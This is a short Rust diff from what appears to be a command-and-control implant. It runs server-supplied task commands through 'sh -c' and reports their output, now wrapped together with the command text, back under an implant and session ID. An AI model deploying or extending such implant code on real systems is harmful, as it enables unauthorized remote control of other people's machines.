@@ -7,6 +7,7 @@ use tokio::time::sleep;
 use uuid::Uuid;
 use whoami;
 
+
 use rb::message::*;
 use rb::task::*;
 
@@ -83,6 +84,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         for task in tasks {
             println!("Executing command: {}", task.command);
             let output = Command::new("sh").arg("-c").arg(&task.command).output()?;
+            let cmd_output = CommandOutput::Text(format!(
+                "Command: {}\nOutput: {}",
+                task.command,
+                String::from_utf8_lossy(&output.stdout)
+            ));
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
 
             let now = SystemTime::now();
@@ -90,7 +96,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 task_id: task.id,
                 implant_id,
                 session_id: task.session_id,
-                output: stdout.clone(),
+                output: cmd_output,
                 error: Some(String::from_utf8_lossy(&output.stderr).to_string()),
                 completed_at: now,
                 status: TaskStatus::Completed,
